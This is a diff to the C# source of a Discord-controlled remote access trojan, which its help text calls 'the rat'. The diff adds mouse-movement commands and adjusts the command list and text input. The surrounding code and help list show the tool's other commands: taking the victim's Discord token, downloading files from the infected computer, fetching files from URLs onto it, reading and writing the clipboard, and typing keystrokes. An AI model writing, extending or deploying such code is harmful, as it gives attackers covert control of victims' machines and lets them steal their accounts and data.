@@ -24,6 +24,9 @@ using System.Net.Sockets;
 using System.Windows.Forms;
 using Salaros.Configuration;
 using AudioSwitcher.AudioApi.CoreAudio;
+using System.Collections.Generic;
+using System.Reflection;
+using Microsoft.VisualBasic.Devices;
 
 namespace Discord_Main
 {
@@ -63,19 +66,21 @@ namespace Discord_Main
                 "!Download(Path) = Download a file from computer.\n" +
                 "!Gettoken = Get discord token.\n" +
                 "!Mousepos(x position, y position) = Set mouse position.\n" +
+                "!MouseMove(x position, y position) = Move mouses current positon by new.\n" +
+                "!MouseMoveSmooth(x position, y position, number) = Move mouses current positon by new smoothly.\n" +
                 "!Download_from_url(url, filename) = Downloads a file from url to computer.\n" +
-                "!Set_Group(channel) Sets the group of the computer.Max groups are 1.\n" +
-                "!Remove_Group Remove group from computer.\n" +
-                "!Get_Group Gets the group this computer is in.\n" +
-                "!PingIp(ip, data) Ping a url/server/ip.\n" +
-                "!Website(url) Open Website.\n" +
-                "!Clipboard Get clipboard.\n" +
-                "!Set_Clipboard(Text) Set clipboard.\n" +
-                "!Click click\n" +
-                "!Write(Text) write words.\n" +
-                "!Volume(number) Set volume.\n" +
-                "!Mute Mute device.\n" +
-                "!Unmute Unmute device.\n" +
+                "!Set_Group(channel) = Sets the group of the computer.Max groups are 1.\n" +
+                "!Remove_Group = Remove group from computer.\n" +
+                "!Get_Group = Gets the group this computer is in.\n" +
+                "!PingIp(ip, data) = Ping a url/server/ip.\n" +
+                "!Website(url) = Open Website.\n" +
+                "!Clipboard = Get clipboard.\n" +
+                "!Set_Clipboard(Text) = Set clipboard.\n" +
+                "!Click = click\n" +
+                "!Write(Text) = write words.\n" +
+                "!Volume(number) = Set volume.\n" +
+                "!Mute = Mute device.\n" +
+                "!Unmute = Unmute device.\n" +
                 "!Exit = Close the rat.\n" +
                 "```"
                 );
@@ -280,6 +285,33 @@ namespace Discord_Main
                 return;
             Cursor.Position = new Point(x, y);
         }
+        [Command("MouseMove"), Description("Move mouses current positon by new.")]
+        public async Task MouseMove(CommandContext ctx, int x, int y)
+        {
+            if (channelcheck(ctx.Channel.Id.ToString()) == false)
+                return;
+            Cursor.Position = new Point(Cursor.Position.X + x, Cursor.Position.Y + y);
+        }
+        [Command("MouseMoveSmooth"), Description("Move mouses current positon by new smoothly.")]
+        public async Task MouseMoveSmooth(CommandContext ctx, int x, int y, int steps)
+        {
+            if (channelcheck(ctx.Channel.Id.ToString()) == false)
+                return;
+            x = Cursor.Position.X + x;
+            y = Cursor.Position.Y + y;
+            var CursorX = Cursor.Position.X;
+            var CursorY = Cursor.Position.Y;
+            var diff_X = x - Cursor.Position.X;
+            var diff_Y = y - Cursor.Position.Y;
+            int pointNum = steps;
+            var interval_X = diff_X / (pointNum + 1);
+            var interval_Y = diff_Y / (pointNum + 1);
+            for (int i = 1; i <= pointNum; i++)
+            {
+                Cursor.Position = new Point(CursorX + interval_X * i, CursorY + interval_Y * i);
+                Thread.Sleep(5);
+            }
+        }
 
         [Command("Download_from_url"), Description("Downloads a file from url to currect dir.")]
         public async Task Download_from_url(CommandContext ctx, string url, string filename)
@@ -416,7 +448,7 @@ namespace Discord_Main
         }
 
         [Command("Write"), Description("Write words.")]
-        public async Task Write(CommandContext ctx, string text)
+        public async Task Write(CommandContext ctx, [RemainingText]string text)
         {
             if (channelcheck(ctx.Channel.Id.ToString()) == false)
                 return;
